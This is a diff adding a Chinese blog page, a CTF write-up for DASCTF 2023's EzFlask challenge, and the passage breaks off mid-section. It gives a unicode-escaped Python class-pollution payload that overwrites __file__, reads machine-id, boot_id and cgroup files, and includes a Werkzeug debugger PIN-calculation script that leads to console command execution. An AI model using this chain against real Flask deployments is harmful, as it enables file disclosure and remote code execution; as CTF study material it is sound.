@@ -1,0 +1,570 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>DASCTF 2023 &amp; 0X401 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EzFlask"><span class="toc-number">2.</span> <span class="toc-text">EzFlask</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E6%B1%A1%E6%9F%93-static-folder%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.1.</span> <span class="toc-text">非预期 (污染_static_folder获取环境变量)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-cms"><span class="toc-number">3.</span> <span class="toc-text">ez_cms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MyPicDisk"><span class="toc-number">4.</span> <span class="toc-text">MyPicDisk</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>DASCTF 2023 &amp; 0X401</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/25
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF线上赛
+            </a>
+        </span>
+        
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">6分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>记错比赛日期了，下午才发现开打了</del>，然后就现学了一个python原型链污染，最后没想到读文件算pin还没做出来ww</p>
+<p>还是学到不少东西的</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#EzFlask">Boogipop的wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3MjcwOTAwNw==&mid=2247484933&idx=1&sn=60ae6e59096e22a2b60bb7ba4e80ce04&chksm=ceea68e5f99de1f3b072baf3c069c4f1530f5c17b34811e51133d42fbfe9de4638d5b5f14071&mpshare=1&scene=23&srcid=072376b235QJm9tNCYWMZFQU&sharer_sharetime=1690091289890&sharer_shareid=9c0f9b7dd366a1431577547d077f70be#rd">n03tAck team的wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247493970&idx=1&sn=9a20317104c56bd5060763e1461908ea&chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&mpshare=1&scene=23&srcid=07256NyrGaLqc95MJJrprw2j&sharer_sharetime=1690256252504&sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd">EDI的wp</a></p>
+<span id="more"></span>
+
+<h1 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h1><blockquote>
+<p>python原型链污染+算pin</p>
+</blockquote>
+<p>进入题目可以直接看到源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid
+
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session
+<span class="token keyword">from</span> secret <span class="token keyword">import</span> black_list
+<span class="token keyword">import</span> json
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">False</span>
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+
+<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
+                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
+        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
+            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
+
+<span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">""</span>
+        self<span class="token punctuation">.</span>password <span class="token operator">=</span> <span class="token string">""</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>username <span class="token operator">==</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>password <span class="token operator">==</span> data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">True</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+Users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>
+            data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data <span class="token keyword">or</span> <span class="token string">"password"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>
+            User <span class="token operator">=</span> user<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            merge<span class="token punctuation">(</span>data<span class="token punctuation">,</span> User<span class="token punctuation">)</span>
+            Users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>User<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>
+        <span class="token keyword">return</span> <span class="token string">"Register Success"</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Register Failed"</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data <span class="token keyword">or</span> <span class="token string">"password"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token string">"Login Failed"</span>
+            <span class="token keyword">for</span> user <span class="token keyword">in</span> Users<span class="token punctuation">:</span>
+                <span class="token keyword">if</span> user<span class="token punctuation">.</span>check<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
+                    <span class="token keyword">return</span> <span class="token string">"Login Success"</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Login Failed"</span>
+    <span class="token keyword">return</span> <span class="token string">"Login Failed"</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5010</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>出现了<code>merge</code>函数,，知道这题要利用到<a href="https://c1oudfl0w0.github.io/blog/2023/07/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8F%98%E4%BD%93/">python原型链污染</a></p>
+<p>同时发现整个源码中没有可以进行命令执行的地方，猜测要拿shell，鉴于这是flask框架，首先想到的就是算pin码</p>
+<p>算pin码就需要读文件，这个时候我们发现源码中唯一和文件有关的就是<code>__file__</code>这个全局变量</p>
+<p>那么就尝试在&#x2F;register路由中用python原型链污染来修改<code>__file__</code></p>
+<p>多次尝试发现把<code>__init__</code>给过滤了，于是采用unicode编码进行绕过（记得content-type要改json）</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span>
+<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span>
+<span class="token property">"\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+<span class="token property">"__file__"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先读取一个不存在的文件来弄出报错来</p>
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230725145311050.png" alt="image-20230725145311050"></p>
+<p>得知版本是python3.10</p>
+<p>接着读取<code>/sys/class/net/eth0/address</code></p>
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230725144503111.png" alt="image-20230725144503111"></p>
+<p>返回首页读取uuidnode</p>
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230725144647338.png" alt="image-20230725144647338"></p>
+<p>转为10进制为<code>248627341238210</code></p>
+<p>然后读取<code>/etc/machine-id</code></p>
+<p>得到<code>96cec10d3d9307792745ec3b85c89620</code></p>
+<p>读取<code>/proc/sys/kernel/random/boot_id</code></p>
+<p>得到<code>867ab5d2-4e57-4335-811b-2943c662e936</code></p>
+<p>再读取<code>/proc/self/cgroup</code></p>
+<p>这里有点坑，值取<code>docker-a3f99d993bd69471d6ba721e274e0d893da41f8a2089724c1c4107f9c5e526dd.scope</code></p>
+<p>然后拼接的machine-id是把第一个和第三个拼接在一起</p>
+<p>3.10脚本（by EDI）：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+
+
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'root'</span><span class="token punctuation">,</span>  <span class="token comment"># username</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># modname</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
+    <span class="token string">'/usr/local/lib/python3.10/site-packages/flask/app.py'</span>  <span class="token comment"># getattr(mod, '__file__', None),</span>
+<span class="token punctuation">]</span>
+
+
+<span class="token comment"># This information is here to make it harder for an attacker to</span>
+<span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>
+<span class="token comment"># within the unauthenticated debug page.</span>
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'248627341238210'</span><span class="token punctuation">,</span>  <span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+    <span class="token comment"># Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span>
+    <span class="token string">'96cec10d3d9307792745ec3b85c89620docker-a3f99d993bd69471d6ba721e274e0d893da41f8a2089724c1c4107f9c5e526dd.scope'</span>
+<span class="token punctuation">]</span>
+
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>
+
+
+cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+
+
+<span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
+<span class="token comment"># end up with the same value and generate out 9 digits</span>
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+
+<span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
+<span class="token comment"># we don't have a result yet.</span>
+rv <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
+                num<span class="token punctuation">[</span>x<span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+                <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
+            <span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到pin码为414-002-214</p>
+<p>进入&#x2F;console页面输入pin码即可实现命令执行获取flag</p>
+<p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230725150856845.png" alt="image-20230725150856845"></p>
+<h2 id="非预期-污染-static-folder获取环境变量"><a href="#非预期-污染-static-folder获取环境变量" class="headerlink" title="非预期 (污染_static_folder获取环境变量)"></a>非预期 (污染_static_folder获取环境变量)</h2><p>By Boogipop</p>
+<p>unicode绕过<code>__init__</code>过滤，修改<code>_static_folder</code>为根目录，然后进行目录穿越</p>
+<blockquote>
